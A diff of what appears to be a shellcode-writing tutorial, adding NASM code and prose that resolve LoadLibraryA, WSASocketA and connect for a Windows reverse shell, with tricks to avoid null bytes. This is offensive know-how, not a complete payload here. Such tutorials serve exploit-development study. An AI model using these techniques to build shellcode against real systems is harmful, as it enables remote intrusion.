@@ -226,7 +226,7 @@ C:\Users\IEUser\Documents>a2h.py ws2_32.dllaa
 [u'61616c6c', u'642e3233', u'5f327377']
 ```
 
-So we push the first `DWORD` and then subtract off the `aa` value just like @NytroRST showed us. Then we push the rest, push a stack pointer, and then call `LoadLibraryA`. 
+So we push the first `DWORD` and then subtract off the `aa` value just like @NytroRST showed us. Then we push the rest, push a stack pointer, and then call `LoadLibraryA`. I won't be showing the ascii to hex conversions anymore but this is the gist of it. The only other variation you'll see is me adding a single `a` and subtracting from the `DWORD` value at the `esp` offset by `0x61`, this is to avoid nulls that would be induced by subtracting from the `WORD` value as we did when subtracting `0x6161`. 
 
 Now is a good time to do a register check, here is what our registers look like at this point. 
 ```
@@ -283,6 +283,25 @@ push esp
 push ecx
 call edi
 
-mov [esi + 0x4], eax          ; esi at offset 0x4 will now hold the address of WSASocketA
+mov [esi + 0x4], eax ; esi at offset 0x4 will now hold the address of WSASocketA
 ```
+
+The `WSASocket` function address is now stored at ESI + 0x4 bytes. 
+
+Next, find the location of the `connect` function. 
+```nasm
+; use GetProcAddress to get the location of connect
+push 0x61746365
+sub dword [esp + 0x3], 0x61
+push 0x6e6e6f63
+push esp
+push ecx
+call edi
+
+mov [esi + 0x8], eax ; esi at offset 0x8 will now hold the address of connect
+```
+
+The `connect` function address is now stored at ESI + 0x8 bytes.
+
+We've now safely stored all of our networking functions on the stack. We just need to locate `CreateProcessA` and `ExitProcess` now. Keep in mind these functions are exported from `kernel32.dll` 
 
